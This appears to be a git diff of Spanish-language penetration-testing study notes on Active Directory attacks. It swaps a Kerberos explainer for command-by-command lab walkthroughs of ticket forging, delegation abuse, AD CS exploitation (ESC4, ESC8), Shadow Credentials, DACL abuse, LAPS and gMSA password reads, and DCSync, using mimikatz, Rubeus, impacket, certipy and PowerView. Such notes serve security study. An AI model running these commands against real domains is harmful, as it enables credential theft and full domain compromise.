+> El ST está cifrado con la clave de la cuenta que ejecuta el servicio. Si el atacante tiene esa clave, puede **fabricar STs válidos** para ese servicio concreto, sin pasar por el KDC.
+
+A diferencia del Golden ticket, este da acceso solo al servicio comprometido pero es más sigiloso. Para ello se necesita el **hash NTLM de la cuenta de servicio** (obtenible por ejemplo mediante Kerberoasting u otras técnicas).
+
+```bash
+# Windows
+.\mimikatz.exe 'kerberos::golden /domain:dominio.local /sid:<domainSID> /rc4:<krbtgtNThash> /id:500 /user:usuario /service:servicio' exit
+
+.\rubeus.exe asktgs /user:<USER> /rc4:<HASH> /domain:dominio.local /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd
+
+# Kali
+impacket-ticketer -dc-ip 10.10.10.10 -spn CIFS/AD01.Domain.local -domain-sid <domainSID> -nthash <NThash> -domain domain.local Administrator
+```
+
+> En cuanto a pass the ticket o pass the key están en el modulo de movimiento lateral
+
+---
+## 1.4. Ataques de Delegación
 
 > [!NOTE]
-> Kerberos es un **protocolo de autenticación** basado en tickets que permite implementar **Single Sign-On (SSO)** en entornos de Active Directory. En lugar de enviar la contraseña cada vez, el usuario demuestra su identidad una sola vez y recibe tickets que le abren las puertas a los distintos servicios.
+> La delegación permite que un servicio actúe **en nombre de un usuario** frente a otro servicio de otra máquina. Fue diseñada para resolver el "Double Hop problem", haciendo que el servicio cachee las credenciales del usuario (los tickets) y los pueda enviar. Es muy útil para para arquitecturas de múltiples capas `web → BBDD, web → SMB...`, pero peligrosa si está mal configurada. 
 
-**Puerto por defecto:** `88`    **Cuenta de servicio:** `KRBTGT`
-
-Kerberos funciona como un sistema SSO con tres actores bien diferenciados:
-
-| Actor                      | Nombre técnico                  | Función                             |
-| -------------------------- | ------------------------------- | ----------------------------------- |
-| 👤 Usuario                 | Client                          | Quien quiere acceder a los recursos |
-| 🏛️ Proveedor de identidad | KDC _(Key Distribution Center)_ | Emite y valida los tickets          |
-| 🖥️ Servicio               | Service Provider                | El recurso al que se quiere acceder |
+Existen tres modelos, de menos a más seguro:
 
 ---
-## 1.1. 🎟️ Los tickets: las llaves del sistema
-
-En vez de usar la contraseña repetidamente, Kerberos usa dos tipos de tickets:
-
-| Ticket 🎟️                       | Uso                                                                         | Protección 🔐                                                                                                            |
-| -------------------------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
-| **TGT — Ticket Granting Ticket** | El **carnet de identidad** del usuario. Demuestra su identidad ante el KDC. | Está cifrado con la clave de la cuenta **KRBTGT**, por tanto solo lo puede leer el KDC-TGS.                              |
-| **ST — Service Ticket**          | El **pase de acceso** a un servicio concreto. Lo obtienes a cambio del TGT  | Está cifrado con la clave de la **cuenta que ejecuta el servicio**, por tanto solo lo puede leer el servicio de destino. |
-
-> _El usuario solo puede transportar los tickets, sin leerlos ni modificarlos, ya que están cifrados con claves que solo poseen los servidores. Es como llevar un sobre sellado._
-
-El KDC tiene dos componentes que trabajan en secuencia:
-
-- **KDC-AS (Auth Service)**: se encarga de la autenticación y emite el TGT
-- **KDC-TGS (Ticket Granting Service)**: cambia un TGT por un ST para el servicio final
-
----
-## 1.2. 🏷️ SPN — Service Principal Name
-
-Los servicios se identifican ante Kerberos mediante el **SPN**, un atributo de la cuenta de servicio con este formato: `SERVICIO/host:puerto`.
-
- > _Por ejemplo, `MSSQLSvc/SQL01.dominio.local:1433`: el servicio de MSSQL se ejecuta por el puerto 1433 en el host SQL01 del dominio.local._
-
-Cuando el usuario pide acceso a un servicio, le indica al KDC el SPN de ese servicio. El KDC busca qué cuenta tiene ese SPN y cifra el ST con su clave. Así, solo esa cuenta de servicio puede descifrar el ticket.
-
----
-
-## 1.3. 🔄 El flujo completo de autenticación
-
-El proceso son **6 mensajes en 3 fases**. La idea central es siempre la misma: el usuario demuestra que tiene la clave correcta cifrando un _timestamp_, y a cambio recibe un ticket más una clave de sesión temporal.
+### 1.4.1. Unconstrained Delegation
+Cuando un usuario se autentica contra una máquina con Unconstrained Delegation, su **TGT completo queda almacenado en esa máquina**. La máquina puede usarlo para acceder a cualquier servicio en nombre del usuario.
 
 ```
-  USUARIO                  KDC-AS               KDC-TGS              SERVICIO
-     │                       │                     │                     │
-     │──── 1. AS-REQ ──────> │                     │                     │
-     │<─── 2. AS-REP ────────│                     │                     │
-     │                       │                     │                     │
-     │──────────────────────── 3. TGS-REQ ────────>│                     │
-     │<─────────────────────── 4. TGS-REP ─────────│                     │
-     │                       │                     │                     │
-     │────────────────────────────────────────────── 5. AP-REQ ─────────>│
-     │<───────────────────────────────────────────── 6. AP-REP ──────────│
+Admin                          AD02 (Unconstrained)                        AD01 (DC)
+  │                                      │                                     │
+  │──── se conecta por SMB ──▶ Atacante compromete AD02 ──── ST como Admin ───▶│
+  │     (TGT queda en AD02)    [extrae TGT del Admin]   ◀─── acceso total ─────│
+```
+
+Necesitamos comprometer una **máquina o cuenta con Unconstrained Delegation** activada y conseguir que un usuario privilegiado se autentique contra ella. Por ejemplo la víctima usa `Test-NetConnection maquina -Port 445` y luego `dir \\maquina.dominio.local\$C`.  Se puede forzar esta autenticación con el Printer Bug (MS-RPRN)
+
+> 🛠️ Config 🛠️
+> 1. A un sistema se le activa la delegación `Set-ADAccountControl -IDentity AD02$ -TrustedForDelegation $true`
+> 2. El atacante ha comprometido a un administrador local de esa máquina, `net localgroup Administrators admin /add`
+
+Con rubeus monitorizamos en la máquina los tickets hasta dar con el de algun "Domain Admin".  Luego copiamos el ticket y lo listamos con `klist` para ver si se cargó en memoria:
+```
+.\rubeus.exe monitor /interval:7 /ptt /nowrap
+```
+
+
+---
+### 1.4.2. Constrained Delegation
+La delegación está restringida a servicios específicos, definidos en el atributo `msDS-AllowedToDelegateTo`. Funciona mediante dos extensiones:
+
+| Extensión | Función |
+|---|---|
+| **S4U2Self** | La cuenta de servicio obtiene un ST *hacia sí misma* en nombre de otro usuario |
+| **S4U2Proxy** | Usa ese ST como prueba para pedir un ST hacia el servicio final permitido |
+Solo funciona hacia los servicios listados en `msDS-AllowedToDelegateTo`. No se puede saltar a otros servicios
+
+```
+Atacante (cuenta comprometida                              KDC              CIFS/AD01
+con delegación hacia CIFS/AD01)                             │                    │
+   │                                                        │                    │
+   │── S4U2Self: "dame ST para mí como Administrator" ─────▶│                    │
+   │◀───── ST (para la cuenta) ─────────────────────────────│                    │
+   │                                                        │                    │
+   │── S4U2Proxy: "dame ST para CIFS/AD01 como Admin" ─────▶│                    │
+   │◀───── ST para CIFS/AD01 ───────────────────────────────│                    │
+   │                                                        │                    │
+   │─────────────────────────────────────────────────────────── AP-REQ ─────────▶│
+```
+
+Necesitamos Comprometer una **cuenta con SPN y Constrained Delegation** configurada hacia un servicio concreto.
+
+> 🛠️ Config 🛠️
+> 1. Se le asigna un SPN a un usuario `setspn -A test/spn`
+> 2. En **dsa.msc**: `Dominio.local > Users > Usuario > Delegation > Trust this user for delegation > Use Any authentication Protocol` y seleccionamos un servicio en una máquina (el DC), por ejemplo *cifs/AD01.dominio.local*
+
+Obtenemos el Service Ticket desde Linux con:
+```bash
+impacket-getST dominio.local/admin:pass123 -spn cifs/AD01.dom.local -impersonate Administrator \
+	-dc-ip 10.10.10.10
+```
+
+---
+### 1.4.3 Resource-Based Constrained Delegation (RBCD)
+Necesitamos el permiso de **escritura sobre el atributo** `msDS-AllowedToActOnBehalfOfOtherIdentity` del servicio destino (por ejemplo por `GenericWrite` o `GenericAll`).
+
+A diferencia de los modelos anteriores, aquí **es el servicio destino quien decide** qué cuentas pueden delegar hacia él. Esto se controla desde el objeto del propio recurso, no desde la cuenta que delega.
+
+```
+  Constrained clásica:          RBCD:
+  "Yo decido a dónde voy"       "Yo decido quién entra"
+  
+  cuenta_servicio               recurso_destino
+  └── msDS-AllowedToDelegateTo  └── msDS-AllowedToActOnBehalfOf
+      └── cifs/DC01                 └── cuenta_atacante
+```
+
+En un ataque, si se tiene `GenericWrite` sobre un objeto equipo (muy común en mal configuradas), se puede apuntar `msDS-AllowedToActOnBehalfOfOtherIdentity` a una cuenta controlada por el atacante y luego usar S4U2Self + S4U2Proxy para obtener un ST como cualquier usuario hacia ese equipo.
+
+> [!TIP] 
+> Mitigación general para delegación
+> - Añadir cuentas sensibles al grupo **Protected Users** (no pueden ser delegadas)
+> - Marcar cuentas críticas como **"La cuenta es confidencial y no se puede delegar"**
+> - Auditar regularmente los atributos de delegación en el dominio
+> - Limitar `GenericWrite` sobre objetos de equipo
+
+----
+## 1.4. Ataques a AD CS
+Si en la máquina existe `ACDS`, podemos usar la herramienta [certipy](https://github.com/ly4k/Certipy/releases) para enumerarlo. 
+```
+certipy find -u belen@dom.local -p pass123 -dc-ip 10.10.10.10 -vulnerable -stdout
+```
+
+--------
+#### ESC4
+Es una vulnerabilidad de AD-CS que ocurre cuando un usuario comprometido ("belen") pertenece al grupo `Cert Publishers`, lo que le permite modificar  templates de certificados (permisos `Owner`, `WriteOwner` o `WriteDACL`)
+
+Ocurre por privilegios como . Al modificar la plantilla pueden dar lugar a otras vulnerabilidades como `ESC1`, permitiendo crear certificados para por ejemplo el administrador
+```bash
+$: certipy-ad template -u belen@dom.local -p pass123 -template DunderMifflinAuthentication -save-old -dc-ip 10.10.10.10
+# [*] Successfully updated 'DunderMifflinAuthentication'
+# Permite tambien PtH con el parametro '-hashes <hash>'
+
+$: certipy req -ca DOM-AD01-CA -u belen -p pass123 -dc-ip 10.10.10.10 -template DunderMifflinAuthentication -target AD01.dom.local -upn administrator@dom.local
+# [*] Saved certificate and private key to 'administrator.pfx'
+$: certipy-ad auth -pfx Administrator.pfx -dc-ip 10.10.10.10
+```
+
+#### ESC8 
+Este es un ataque NTLM relay contra el endpoint web AD CS por HTTP (ruta `/CertSrv`). Mediante ntlmrelayx se monitorea la red en busqueda de certificados que poder guardar en un archivo para aprovecharlos y autenticarse con ellos en servicios. A esto se le conoce como "**Pass the certificate**" y se realiza con la herramienta [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). Esto se puede forzar con el **printer bug**. 
+```bash
+impacket-ntlmrelayx -t http://10.10.10.11/certsrv/certfnsh.asp --adcs -smb2support \
+	--template KerberosAuthentication
+# [*] Writing PKCS#12 certificate to ./DC01$.pfx
+
+python3 printerbug.py DOM.LOCAL/belen:pass123@10.10.10.10 <ip_kali>
+
+python3 gettgtpkinit.py -cert-pfx ../krbrelayx/AD01\$.pfx -dc-ip 10.10.10.10 'dom.local/AD01$' /tmp/dc.ccache
+# Error libcrypto -> pip3 install -I git+https://github.com/wbond/oscrypto.git
+```
+
+We can now perform a `Pass-the-Certificate` attack to obtain a TGT as `AD01$`. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the repository and install the dependencies:
+
+-----
+#### Shadow Credentials (msDS-KeyCredentialLink) 
+El Ataque Shadow Credentials abusa del atributo `msDS-KeyCredentialLink` de la víctima. Este atributo guarda las claves publicas que se pueden usar para autenticarse por PKINIT. 
+
+> El Bloodhound encontramos que el usuario `A` tiene el privilegio `AddKeyCredentialLink` sobre el usuario `B`
+
+Podemos usar la herramienta [pywhisker](https://github.com/ShutdownRepo/pywhisker) y [gettgtpkinit](https://github.com/dirkjanm/PKINITtools) para efecutar el ataque desde una máquina LINUX. Este comando genera un certificado `X.509 certificate` y escribe la clave pública en el atributo de la víctima.
+
+```bash
+pywhisker --dc-ip 10.10.10.10 -d WEB.LOCAL -u A -p 'pass123' --target B --action add
+# [+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx 
+# [*] Must be used with password: bmRH4LK7UwPrAOfvIx6W 
+
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.10.10 DOM.LOCAL/B /tmp/B.ccache
+```
+
+Ahora exportamos el certificado y usamos las herramientas (habiendo configurado `krb5.conf`)
+
+--------
+
+# 2. DACL abuse
+
+## 2.1. Enumeración con Bloodhound
+> [!NOTE]
+> BloodHound es una herramienta de análisis y visualización de entornos Active Directory que se utiliza en auditorías de seguridad para identificar relaciones entre usuarios, grupos, equipos, permisos y rutas de ataque que podrían permitir escalar privilegios o llegar a activos críticos. 
+> 
+> Funciona apoyándose en Neo4j, una base de datos orientada a grafos, donde almacena esas relaciones como nodos y aristas para poder consultarlas y representarlas visualmente. Por detrás, sus recolectores obtienen información del dominio mediante consultas LDAP contra controladores de dominio.
+
+1. Se instala con  `sudo-apt install bloodhound `
+2. La primera vez que lo ejecutamos, nos muestra un panel, que nos dice que se ejecuta el comando  `bloodhound-setup` . Esperamos a que realice la configuración de neo4j y nos dice que las credenciales iniciales son `neo4j:neo4j`.
+3. Se nos abre en el localhost una instancia de neo4j y simplemente tenemos que poner las credenciales que nos han dado. 
+4. El siguiente panel nos pide que actualicemos las credenciales. Nos pide que cambiemos este archivo con la nueva contraseña.
+5. Ponemos el comando  `bloodhound`  en la consola y se abre una instancia de la herramienta, solo nos queda poner las credenciales:
+
+Teniendo credenciales válidas, podemos obtener información en el dominio. Indicamos con este comando que queremos usar todos los ingestors con  `-c all`  y que queremos un archivo zip resultante. `<hash>_bloodhound.zip` 
+```
+bloodhound-python -u <usuario> -p <contraseña> -d <dominio>.local -ns <ip_del_dc> -c all --zip
+```
+
+> Si hemos terminado nuestro trabajo con un entorno o queremos simplemente actualizar los datos, tenemos que borrar los anteriores. Para ello nos vamos a `Administration 🡆 Database Management`. Ahí seleccionamos los datos de active directory ("**Active Directory Data**") y los datos de ingesta ("**File ingest log history**")
+
+----------
+## 2.2. Configs
+Para configurarlos, nos vamos a `Active Directory Users and Computers`, se selecciona un usuario (`B`) o un grupo y en `Security` tenemos los permisos. Si le damos a `Add` podemos añadir el sujeto que tendrá el privilegio sobre el nuestro (`A`)
+
+| Permiso                     | Descripción                            | Config                                             |
+| --------------------------- | -------------------------------------- | -------------------------------------------------- |
+| `ForceChangePassword`       | `A` puede cambiar la contraseña de `B` | En `B` 🡆 `Reset Password` para `A`                |
+| `Addself`                   | `A` puede meterse en el `Grupo`        | En `Grupo`🡆 `Add/Remove self as member` para `A`  |
+| `Write Owner` sobre usuario | `A` puede apropiarse de `Grupo`        | En `Grupo` 🡆 `Advanced` 🡆`Modify Owner` para `A` |
+| `Write Owner` sobre grupo   | `A` puede apropiarse de `B`            | En `B` 🡆 `Advanced` 🡆 `Modify Owner` sobre `A`   |
+
+----
+## 2.3. ForceChangePassword
+
+> [!WARNING]
+**El permiso ForceChangePassword permite restablecer la contraseña de otro usuario sin conocer la contraseña actual.**
+
+Es un permiso que se aplica sobre uno o varios objetos de usuario y suele utilizarse en tareas de soporte técnico, por ejemplo cuando un usuario olvida su contraseña o cuando una cuenta ha podido verse comprometida y es necesario recuperar su acceso. En estos casos, normalmente también se marca la opción **“User must change password at next logon”**, para que el usuario establezca una nueva contraseña en el siguiente inicio de sesión y recupere así el control de su cuenta una vez finalizadas las tareas de soporte o remediación.
+
+> Bloodhound: Tenemos a `A` 🡆 `Outbound Object Control` 🡆 `Force Change Password` sobre `B`
+
+```bash
+WINDOWS: Set-DomainUserPassword -Identity "B" -AccountPassword (ConvertTo-SecureString "pass123" -AsPlainText -Force)
+  
+KALI rpclient: setuserinfo B 23 pass123
 ```
 
 ----
 
-### 1.3.1. Fase 1 — Autenticación inicial (AS)
+## 2.4. Addself
 
-**1️⃣ AS-REQ — El usuario se presenta**
+> [!WARNING]
+**El permiso AddSelf en Active Directory permite que una cuenta se añada o elimine a sí misma de la membresía de un grupo.**
 
-El usuario envía al **KDC-AS**:
+Este privilegio solo se puede aplicar sobre grupos. **Es muy peligroso cuando se aplica sobre grupos privilegiados, ya que un atacante que comprometa una cuenta con este permiso podría autoañadirse al grupo y heredar los privilegios asociados a él.**
 
-- Su **nombre de usuario**
-- Un **authenticator**: timestamp cifrado con su _client key_ (derivada de su contraseña con AES o RC4)
+> Bloodhound: Tenemos a `A` 🡆 `Outbound Object Control` 🡆 `AddSelf` sobre `Grupo`
 
-> _El cifrado del timestamp demuestra que conoce la contraseña sin enviarla._
+Para la explotación por tanto solo tiene que autoañadirse al grupo sobre el que tiene los permisos.
+```bash
+PS: Add-DomainGroupMember -Identity <grupo> -Members A
+CMD: net group Grupo A /add /domain
+```
 
----
+## 2.5. Write Owner / Write DACL / Generic Write
 
-**2️⃣ AS-REP — El KDC responde con el TGT**
+> [!WARNING]
+**El permiso WriteOwner en Active Directory permite cambiar el propietario de un objeto.** Este propietario puede modificar el DACLdel objeto, es decir, la lista de permisos que determina las acciones que puedan realizar el resto de usuarios con él. 
 
-El **KDC-AS** descifra el timestamp con la copia de la _client key_ que tiene en su base de datos. Si es válido, devuelve:
+GenericWrite permite tambien modificar los atributos y permisos de un objeto.
 
-- El **TGT** (cifrado con la clave de KRBTGT; el usuario no puede abrirlo)
-- Una copia de la **clave de sesión `Kc.tgs`**, cifrada con la _client key_ del usuario
+Si un atacante compromete una cuenta que tiene WriteOwner sobre un objeto puede convertirse en su dueño y cambiar sus permisos y con WriteDACL cambiarlos directamente. Obtendrá así una escalada de privilegios que puede variar según el tipo de dato del que hablemos
+- Sobre un grupo puede modificar sus permisos y, en algunos casos, añadirse a sí mismo al grupo y heredar así sus privilegios
+- Sobre un usuario puede modificar sus permisos y cambiarle la contraseña o hacerlo kerberoasteable
 
-> _La `Kc.tgs` es la llave temporal para hablar con el KDC-TGS._
+#### Sobre un grupo
 
-----
-### 1.3.2. Fase 2 — Solicitud de ticket de servicio (TGS)
+> Bloodhound: Tenemos a `A` 🡆 `Outbound Object Control` 🡆 `Write Owner` sobre `Grupo`
 
-**3️⃣ TGS-REQ — El usuario pide acceso a un servicio**
+Por tanto nos apropiamos del grupo y modificamos las ACL
+```bash
+. .\Powerview.ps1
+# 1. Nos adueñamos del gripo
+Set-DomainObjectOwner -OwnerIdentity A -Identity Grupo 
 
-El usuario descifra `Kc.tgs` con su _client key_ y envía al **KDC-TGS**:
-- El **TGT** (que no puede leer, pero lo transporta)
-- Un nuevo **authenticator** cifrado con `Kc.tgs`
-- El **SPN** del servicio al que quiere acceder
+# 2. Nos damos derechos, si tenemos WriteDACL podemos hacerlo directamente
+Add-DomainObjectAcl -PrincipalIdentity A -TargetIdentity Grupo -Rights All 
+net group Grupo A /add /domain
+```
 
----
+#### Sobre un usuario
 
-**4️⃣ TGS-REP — El KDC entrega el Service Ticket**
+> Bloodhound: Tenemos a `A` 🡆 `Outbound Object Control` 🡆 `Write Owner` sobre `B`
 
-El **KDC-TGS**:
-1. Descifra el TGT con la clave de KRBTGT → obtiene la identidad del usuario y `Kc.tgs`
-2. Verifica el authenticator y comprueba que el ticket no haya expirado
-3. Busca la cuenta asociada al SPN solicitado
+Los comandos son los mismos para asignar los permisos. Luego podemos
+- **Cambiarle la contraseña**: lo mismo que con `Force Change Password`
+- **Hacerlo kerberoasteable**: `set-DomainObject -Identity B -Set @{serviceprincipalname='lol/xd'}`
 
-Si todo es correcto, devuelve:
-- El **ST** (cifrado con la clave del servicio destino)
-- Una copia de la **clave de sesión `Kc.s`**, cifrada con `Kc.tgs`
 
-> _La `Kc.s` es la llave temporal para hablar directamente con el servicio._
+## 2.6. Read GMSA Password
 
-----
-### 1.3.3. Fase 3 — Acceso al servicio (AP)
+> [!WARNING]
+Una **gMSA** (group Managed Service Account) es una cuenta de dominio especial para ejecutar servicios con gestión automática de contraseña. En este caso, el DC genera una contraseña aleatoria que se manda a los equipos gMSA para que ejecuten los servicios, tareas programadas o aplicaciones que necesiten.
 
-**5️⃣ AP-REQ — El usuario llama a la puerta del servicio**
+Por ejemplo al configurar el equipo que gestiona la web IIS, no se introduce siquiera una contraseña en la configuración del servicio web, solo se le da el permiso gMSA al equipo. 
 
-El usuario descifra `Kc.s` con `Kc.tgs` y envía al **servicio**:
-- El **ST** (que el servicio sí puede abrir)
-- Un nuevo **authenticator** cifrado con `Kc.s`
+Pues bien, el permiso **ReadGMSAPassword** permite leer esa contraseña del equipo autorizado y hacerse pasar por ese servicio. Si este tiene acceso a recursos críticos, el atacante heredará dicho acceso.
 
----
-**6️⃣ AP-REP — El servicio abre la puerta** _(opcional)_
+Para la explotación tenemos varias vías.
+- Si está LDAPs activado (LDAP sobre TLS, puerto 636), se puede realizar desde kali con la herramienta [gmsadumper(opens in a new tab)](https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py).
+- Si se utiliza el LDAP normal, se tiene que subir la herramienta **Invoke-GMSAPasswordReader**, la cual se tiene que subir a la máquina desde la cuenta con los privilegios
 
-El **servicio**:
-1. Descifra el ST con su propia clave → obtiene la identidad del usuario y `Kc.s`
-2. Descifra el authenticator con `Kc.s` y verifica la identidad y el timestamp
-3. ✅ Concede acceso
+> Bloodhound: Tenemos a `A` 🡆 `Outbound Object Control` 🡆 `ReadGMSAPassword` sobre `B`
 
-> [!NOTE] El AP-REP es **opcional** y sirve para **autenticación mutua**: el servicio demuestra al usuario que también es quien dice ser.
-
----
-
-## 1.4. 🗝️ Resumen de claves y quién las conoce
-
-| Clave                           | Se usa para cifrar...                         | La tiene...              |
-| ------------------------------- | --------------------------------------------- | ------------------------ |
-| Client key                      | Authenticators del usuario, copia de `Kc.tgs` | El Usuario y el KDC-AS   |
-| Clave de **KRBTGT**             | El **TGT**                                    | Solo el KDC              |
-| Clave de **cuenta de servicio** | El **ST**                                     | El KDC y el Servicio     |
-| `Kc.tgs` _(sesión temporal)_    | Authenticators hacia el TGS, copia de `Kc.s`  | El Usuario y el KDC-TGS  |
-| `Kc.s` _(sesión temporal)_      | Authenticators hacia el servicio              | El Usuario y el Servicio |
-
-> [!IMPORTANT]
-> **La clave del diseño**: Cada clave de sesión (`Kc.tgs`, `Kc.s`) es temporal y específica para esa comunicación. Si alguien la intercepta, no sirve para nada más. Las claves permanentes (la contraseña del usuario, la clave de KRBTGT...) nunca viajan por la red.
+```bash
+. .\gmsa.ps1
+Invoke-GMSAPasswordReader -Command ¨"--AccountName B" 
+```
 
 ---
-## 1.5. 🎭 Delegación en Kerberos
+## 2.7. Read LAPS Password
 
-La delegación permite que un **servicio actúe en nombre de un usuario** frente a un segundo servicio (por ejemplo, un servidor web que consulta una base de datos con la identidad del usuario que hizo login, no con su propia identidad).
+> [!WARNING]
+LAPS (Local Administrator Password Solution) es similar. Sirve para generar una contraseña robusta y rotada automáticamente para los administradores locales de cada equipo del AD.  Esta la genera y la guarda el DC. 
 
-|Tipo|Descripción|Riesgo|
-|---|---|---|
-|**Unconstrained Delegation**|El servicio recibe una copia del **TGT completo** del usuario y puede usarlo para autenticarse como él ante **cualquier otro servicio**|Muy alto: si el servidor se compromete, se puede extraer el TGT de cualquier usuario que se haya autenticado en él|
-|**Constrained Delegation**|El servicio solo puede impersonar al usuario ante una **lista concreta de SPNs** definida en su atributo `msDS-AllowedToDelegateTo`|Medio: el abuso se limita a los servicios listados|
-|**Resource-Based Constrained Delegation (RBCD)**|El control se define **en el recurso destino**, no en el servicio origen: el recurso decide qué cuentas pueden delegar hacia él (`msDS-AllowedToActOnBehalfOfOtherIdentity`)|Depende de quién puede modificar ese atributo del recurso|
+Se usa sobre todo para soporte, administración y recuperación de equipos. Por ejemplo, si un técnico necesita entrar en un servidor o un PC con la cuenta de administrador local, puede consultar la contraseña LAPS vigente. Esto evita que se reduzcan los ataques de movimiento lateral y pass-the-hash porque impide que se reutilicen las mismas contraseñas.
 
-> _La diferencia clave entre Constrained y RBCD es **quién configura el permiso**: en Constrained lo hace un admin sobre la cuenta del servicio origen; en RBCD lo hace quien tiene control sobre el objeto destino._
+Si un atacante compromete una cuenta con el permiso "ReadLAPSPassword" podrá leer la contraseña del admin de todas las máquinas y comprometer la red entera. Para ello podrá utilizar la suite de impacket o el propio netexec:
 
-----
-## 1.6. 🔑 NTLM: la alternativa a Kerberos
+```
+impacket-GetLAPSPassword <dominio>.local/<usuario>:<contraseña> -dc-ip <ip>
 
-**NTLM (NT LAN Manager) es un protocolo de autenticación más antiguo que Kerberos**, basado en un esquema de reto-respuesta (challenge-response) en lugar de tickets. AD lo mantiene activo por compatibilidad, aunque Kerberos es el protocolo preferente cuando está disponible.
+nxc ldap <ip> -d <dominio>.local -u <usuario> -p <contraseña> --module laps
+```
 
-Se usa típicamente cuando:
-- El cliente se conecta directamente por IP (sin poder resolver un SPN/nombre)
-- El servicio o el sistema operativo no soporta Kerberos
-- Se accede a un recurso fuera del dominio o sin confianza Kerberos
+-----
+## 2.8.  GetChanges/Get ChangesAll sobre el dominio - DCSync
 
-> A diferencia de Kerberos, en NTLM **no hay verificación mutua por defecto** ni tickets con caducidad, lo que históricamente lo ha hecho más débil frente a ataques de repetición y relay.
+> [!WARNING]
+**Un atacante se hace pasar funcionalmente por un DC autorizado y usa el mecanismo normal de replicación para solicitar datos secretos del dominio, incluidos atributos sensibles de cuentas.**
+
+Con la suite de impacket, podemos realizar un DCSync de manera muy sencilla con secretsdump y las credenciales de nuestra usuaria privilegiada.
+
+```bash
+impacket-secretsdump DOM.local/A:pass123@ADO1.DOM.local -outputfile hashes.txt
+
+evil-winrm -i 10.10.10.10 -u A -p pass123
+PS> upload mimikatz.exe
+PS> .\mimikatz.exe "lsadump::dcsync /domain:L4H.local /user:Administrator" exit
+```
+
+Al leer el archivo creado, hashes.txt.ntds, podemos filtrar por el hash del usuario que nos interese, como krbtgt, el cual sirve para obtener un golden ticket.
